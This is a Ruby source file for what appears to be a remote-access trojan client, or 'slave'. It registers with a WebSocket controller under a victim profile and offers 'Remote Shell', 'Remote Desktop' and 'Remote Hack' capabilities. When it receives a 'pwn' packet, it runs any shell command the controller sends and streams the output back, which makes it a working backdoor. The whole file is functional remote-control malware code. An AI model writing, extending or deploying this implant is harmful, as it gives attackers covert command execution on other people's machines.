require 'faye/websocket'
require 'eventmachine'
require 'open3'
require 'json'

EM.run {
  ws = Faye::WebSocket::Client.new('ws://localhost:10969')

  ws.on :open do |event|
    p [:open]
    #ws.send('{"header": "identification", "payload": {"id": "2", "type": "Slave", "name": "Android 22", "computer": "4tech-pc", "user": "verbatim", "os": "Linux", "ip": "192.168.1.2", "country": "Philippines", "city": "Minalin", "inators": [{"id": "1111", "name": "Remote Shell"}]}, "trailer": "whoami"}')
    ws.send('{"header": "android", "payload": {"id": "10969", "type": "Slave", "name": "Android 22", "computer": "4tech-pc", "user": "verbatim", "os": "Linux", "ip": "192.168.1.2", "country": "Philippines", "city": "Minalin", "inators": [{"code": "1111", "name": "Remote Shell"}, {"code": "2222", "name": "Remote Desktop"}, {"code": "3333", "name": "Remote Hack"}]}, "trailer": "whoami"}')
  end

  ws.on :message do |event|
    p [:message, event.data]
    begin
      packet = JSON.parse(event.data)
      if packet['header'] == "pwn" then
        client = packet['payload']['android']
        inator = packet['payload']['inator']
        data = packet['payload']['data']
        if inator == "1111" then
          remote_shell(ws, data)
        elsif inator == "2222" then
          desktop_capture(ws, data)
        end
      end
    rescue Exception => ex
      puts ex
    end
  end

  ws.on :close do |event|
    p [:close, event.code, event.reason]
    ws = nil
  end

  def remote_shell(ws, data)
    cmd = data
    puts cmd
    stdin, stdout, stderr, wait_thr = Open3.popen2e(cmd)
    Thread.new {
    while line = stdout.gets
      packet = {
        "header" => "data",
        "payload" => {
          "android" => "10969",
          "inator" => "1111",
          "data" => {"stdout" => "#{line}"}
        },
        "trailer" => "#{line}"
      }.to_json
      ws.send(packet)
      puts line
    end
    }
  end

  def desktop_capture(ws, data)
    cmd = data
    puts cmd
    stdin, stdout, stderr, wait_thr = Open3.popen2e(cmd)
    Thread.new {
    while line = stdout.gets
      packet = {
        "header" => "data",
        "payload" => {
          "android" => "10969",
          "inator" => "2222",
          "data" => {"stdout" => "#{line}"}
        },
        "trailer" => "#{line}"
      }.to_json
      ws.send(packet)
      puts line
    end
    }
  end
}
